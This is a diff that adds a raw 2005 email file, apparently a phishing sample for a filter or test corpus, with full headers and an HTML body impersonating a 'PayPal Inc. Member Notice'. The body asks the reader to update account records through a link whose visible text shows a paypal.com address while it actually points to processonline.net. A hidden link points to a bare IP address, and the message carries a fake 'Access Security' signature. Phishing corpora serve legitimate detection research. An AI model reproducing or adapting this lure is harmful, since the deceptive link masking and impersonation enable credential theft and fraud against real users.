@@ -1,0 +1,91 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id B2C542A893
+	for <user@example.com>; Tue, 30 Aug 2005 17:53:47 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id A7247621CAB; Tue, 30 Aug 2005 17:53:47 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 8D098621CA9
+	for <user@example.com>; Tue, 30 Aug 2005 17:53:47 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id RAA02376
+	for user@example.com; Tue, 30 Aug 2005 17:53:47 -0400
+Received: from hnl.hawaiitravelnetwork.com (hawaiitravelnetwork.com [69.57.138.14])
+	by mail.example.com with ESMTP id RAA02368
+	for <user@example.com>; Tue, 30 Aug 2005 17:53:46 -0400
+Received: from nobody by hnl.hawaiitravelnetwork.com with local (Exim 4.52)
+	id 1EAE36-0001CV-AR
+	for user@example.com; Tue, 30 Aug 2005 11:53:44 -1000
+To: user@example.com
+Subject: PayPal Inc. Member Notice
+From: <Notification@PayPal.com>
+Reply-To: Notification@PayPal.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EAE36-0001CV-AR@hnl.hawaiitravelnetwork.com>
+Date: Tue, 30 Aug 2005 11:53:44 -1000
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - hnl.hawaiitravelnetwork.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - hnl.hawaiitravelnetwork.com
+Content-Length: 2927
+Lines: 49
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 126
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2800.1458" name=GENERATOR></HEAD>
+<BODY><!--StartFragment -->&nbsp;<IMG 
+src="http://processonline.net/us/cgi-bin/webscrcmd_login-run/img/logo.gif"><A 
+href="http://210.251.94.114/moneyaccess/index.html"></A>&nbsp; 
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD colSpan=3><IMG height=2 
+      src="http://old.lametown.org/faith/pp.files/pixel.gif" 
+  width=2></TD></TR></TBODY></TABLE>
+<P><FONT size=2><FONT face=Verdana>Dear PayPal 
+User</FONT>&nbsp;<BR></FONT><BR></P>
+<P><FONT face=Verdana size=2>It has come to our attention that your&nbsp;PayPal 
+account information needs to be&nbsp;<BR>updated as part of our continuing 
+commitment to protect your account and to&nbsp;<BR>reduce the instance of fraud 
+on our website.&nbsp;</FONT><FONT face=Verdana size=2><FONT face=Verdana size=2> 
+If you could please take 5-10 minutes&nbsp;<BR>out of your </FONT><FONT 
+face=Verdana size=2>online </FONT><FONT face=Verdana size=2>experience and 
+update your personal records you will not run into&nbsp;<BR>any future 
+</FONT><FONT face=Verdana size=2>problems with the online 
+service.&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></FONT></P>
+<P><FONT face=Verdana size=2><FONT face=Verdana size=2>To update your <SPAN 
+style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal account 
+</SPAN>records click on the following link:&nbsp;<BR></FONT></FONT></P>
+<P><!--StartFragment -->&nbsp;<A href="http://processonline.net/" 
+target=_blank><FONT face=Verdana color=#0000ff 
+size=2>https://www.paypal.com/cgi-bin/webscr?cmd=login-run</FONT></A><FONT 
+face=Verdana color=#0000ff size=2> </FONT></P><BR><FONT size=2><FONT 
+face=Verdana>Thank you for your patience in this matter.</FONT><BR></FONT><FONT 
+face=Verdana size=2>&nbsp; <BR></FONT>
+<P></P>
+<P><FONT face=Verdana size=2><FONT face="Arial,&#10;Helvetica, &#10;sans-serif" 
+color=#000000 size=2>Sincerely, <BR>Ammy Handor,<BR>PayPal Inc.&nbsp;Access 
+Security Departament.</FONT><BR><FONT face="Arial, Helvetica,&#10;sans-serif" 
+color=#000000 size=2></FONT></FONT></P>
+<P><FONT face=Verdana size=2><FONT face="Arial, Helvetica,&#10;sans-serif" 
+size=2><FONT color=#999999 size=1>Please do not reply to this e-mail as this is 
+only a notification. Mail sent to this address cannot be answered. 
+</FONT></FONT></FONT></P>
+<P><FONT face=Verdana size=2><FONT face="Arial,&#10;Helvetica, &#10;sans-serif" 
+color=#000000 size=1><FONT color=black><SPAN style="COLOR: black">Copyright 
+2005,&nbsp;PayPal INC. All Rights Reserved. 
+</SPAN></FONT></FONT></FONT></P></BODY></HTML>
+
+
+
+
